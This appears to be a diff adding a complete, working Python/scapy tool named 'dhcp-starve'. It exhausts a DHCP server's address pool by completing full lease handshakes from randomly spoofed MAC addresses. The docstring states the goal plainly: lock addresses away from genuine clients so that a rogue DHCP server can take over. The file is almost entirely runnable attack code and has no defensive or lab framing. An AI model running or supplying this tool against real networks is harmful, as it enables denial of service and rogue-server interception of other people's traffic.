@@ -1,0 +1,134 @@
+#!/usr/bin/env python3
+"""dhcp-starve — exhaust a DHCP server's address pool with spoofed clients.
+
+Usage: dhcp-starve <iface> [count]
+
+For each fake client it runs a full DHCP handshake with a fresh random MAC:
+
+    DISCOVER  ->  wait OFFER  ->  REQUEST  ->  wait ACK
+
+so the server COMMITS (leases) the offered address to a client that will never
+use it. One DISCOVER alone does not drain a pool: the address is only held
+tentatively until the matching REQUEST/ACK, so the tool completes the handshake
+each time. It repeats until the pool is empty (no OFFER comes back) or <count>
+leases are taken. With the pool drained the real server can no longer answer a
+genuine client, which is what lets a rogue server take over. Ctrl-C to stop.
+
+The client MACs are spoofed, so the server broadcasts its replies (the tool sets
+the BOOTP broadcast flag); that is how it hears OFFER/ACK aimed at MACs it does
+not own.
+"""
+import random
+import sys
+
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf
+
+conf.verb = 0
+
+OFFER = 2
+ACK = 5
+
+
+def rand_mac():
+    # Locally-administered unicast (02:..): a valid, unused client address.
+    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
+        random.randint(0, 255) for _ in range(5))
+
+
+def mac_bytes(mac):
+    return bytes.fromhex(mac.replace(":", ""))
+
+
+def dhcp_type(pkt):
+    for opt in pkt[DHCP].options:
+        if isinstance(opt, tuple) and opt[0] == "message-type":
+            return opt[1]
+    return None
+
+
+def dhcp_opt(pkt, name):
+    for opt in pkt[DHCP].options:
+        if isinstance(opt, tuple) and opt[0] == name:
+            return opt[1]
+    return None
+
+
+def client_pkt(mac, xid, msg_options):
+    return (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src="0.0.0.0", dst="255.255.255.255") /
+            UDP(sport=68, dport=67) /
+            BOOTP(chaddr=mac_bytes(mac), xid=xid, flags=0x8000) /
+            DHCP(options=msg_options))
+
+
+def send_recv(iface, pkt, xid, want_type, timeout=3.0):
+    """Send pkt, return the first reply carrying our xid and want_type, or None.
+    The packet is sent from the sniffer's started_callback, so the sniffer is
+    already listening before the request leaves — a fast reply is never missed —
+    and stop_filter returns the moment the matching reply arrives."""
+    caught = {}
+
+    def is_reply(p):
+        if (DHCP in p and BOOTP in p and
+                p[BOOTP].xid == xid and dhcp_type(p) == want_type):
+            caught["pkt"] = p
+            return True
+        return False
+
+    sniff(iface=iface, store=False, timeout=timeout, stop_filter=is_reply,
+          started_callback=lambda: sendp(pkt, iface=iface))
+    return caught.get("pkt")
+
+
+def grab_one(iface):
+    """Run one full DORA with a spoofed MAC. Return the leased IP, or None."""
+    mac = rand_mac()
+    xid = random.randint(1, 0xFFFFFFFF)
+
+    offer = send_recv(iface, client_pkt(mac, xid, [
+        ("message-type", "discover"), "end"]), xid, OFFER)
+    if offer is None:
+        return None
+    offered_ip = offer[BOOTP].yiaddr
+    server_id = dhcp_opt(offer, "server_id")
+
+    ack = send_recv(iface, client_pkt(mac, xid, [
+        ("message-type", "request"),
+        ("requested_addr", offered_ip),
+        ("server_id", server_id),
+        "end"]), xid, ACK)
+    if ack is None:
+        return None
+    return offered_ip
+
+
+def main():
+    if len(sys.argv) not in (2, 3):
+        sys.exit(__doc__)
+    iface = sys.argv[1]
+    limit = int(sys.argv[2]) if len(sys.argv) == 3 else 0  # 0 = until drained
+
+    print(f"[*] starving the DHCP pool on {iface} "
+          f"({'until empty' if limit == 0 else f'{limit} leases'})")
+    taken = 0
+    misses = 0
+    try:
+        while limit == 0 or taken < limit:
+            ip = grab_one(iface)
+            if ip is None:
+                misses += 1
+                # Two OFFER-less rounds in a row: treat the pool as drained.
+                if limit == 0 and misses >= 2:
+                    print("[*] no more offers — pool looks empty")
+                    break
+                continue
+            misses = 0
+            taken += 1
+            print(f"[+] leased {ip}  (total {taken})")
+    except KeyboardInterrupt:
+        pass
+    print(f"[*] done: {taken} address(es) locked away from real clients")
+
+
+if __name__ == "__main__":
+    main()
